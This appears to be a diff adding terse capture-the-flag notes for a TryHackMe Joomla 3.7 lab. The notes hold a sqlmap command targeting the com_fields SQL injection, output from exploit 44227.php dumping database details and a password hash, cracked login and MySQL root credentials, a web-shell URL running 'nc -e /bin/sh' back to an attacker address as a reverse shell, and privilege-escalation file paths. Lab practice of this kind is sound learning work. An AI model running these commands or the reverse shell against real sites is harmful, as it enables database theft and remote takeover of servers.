@@ -1,0 +1,26 @@
+searchsploit joomla | grep "3\.7"
+
+sqlmap -u "http://10.10.58.82/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --dbms=mysql --dbs -p list[fullordering]
+
+php -S localhost:8000 44227.php
+	Database username is -> root@localhost
+	Database name is -> 	joomla
+	Database version is -> 	5.5.64-MariaDB
+	Username is -> 	jonah
+	Email is -> 	jonah@tryhackme.com
+	Password hash is -> $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
+
+jonah:spiderman123
+
+# shell with, on port 6661
+http://10.10.234.148/index.php?cmd=nc%20-e%20/bin/sh%2010.9.45.115%206661
+
+# mysql creds:
+root:nv5uz9r3ZEDzVjNu
+
+/etc/crontab
+/var/log/cron
+/var/log/secure
+/var/www/html/bin/
+
+
